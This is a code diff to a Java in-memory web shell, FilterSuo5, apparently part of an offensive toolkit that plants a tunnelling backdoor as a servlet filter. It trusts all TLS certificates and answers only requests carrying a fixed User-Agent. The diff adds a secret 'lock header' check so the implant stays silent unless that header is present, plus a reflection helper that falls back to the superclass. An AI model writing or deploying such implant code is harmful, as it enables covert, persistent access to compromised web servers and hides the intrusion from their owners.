@@ -1,5 +1,6 @@
 package com.ppp.middleware.memshell;
 
+import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.MemShellFunction;
 
@@ -21,12 +22,15 @@ import java.util.HashMap;
  */
 @MemShell(MemShell.Filter)
 @MemShellFunction(MemShellFunction.sou5)
+@JavaClassModifiable({JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class FilterSuo5 implements InvocationHandler, Runnable, HostnameVerifier, X509TrustManager {
     public static HashMap addrs = collectAddr();
     public static HashMap ctx = new HashMap();
 
     InputStream gInStream;
     OutputStream gOutStream;
+    private String lockHeaderKey;
+    private String lockHeaderValue;
 
     public FilterSuo5() {
     }
@@ -46,8 +50,11 @@ public class FilterSuo5 implements InvocationHandler, Runnable, HostnameVerifier
 
     private void task(Object request, Object response, Object filterChain) {
         try {
-            String agent = (String) invokeMethod(request.getClass(), request, "getHeader", new Class[]{String.class}, new Object[]{"User-Agent"});
-            String contentType = (String) invokeMethod(request.getClass(), request, "getHeader", new Class[]{String.class}, new Object[]{"Content-Type"});
+            if(!((String)invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey})).contains(lockHeaderValue)) {
+                return;
+            }
+            String agent = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{"User-Agent"});
+            String contentType = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{"Content-Type"});
 
             if (agent == null || !agent.equals("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3")) {
                 if (filterChain != null) {
@@ -589,6 +596,14 @@ public class FilterSuo5 implements InvocationHandler, Runnable, HostnameVerifier
         return field;
     }
 
+
+    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        try {
+            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
+        }catch (Exception e){
+            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
+        }
+    }
 
     public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         Method method = cls.getDeclaredMethod(methodName, argsClass);
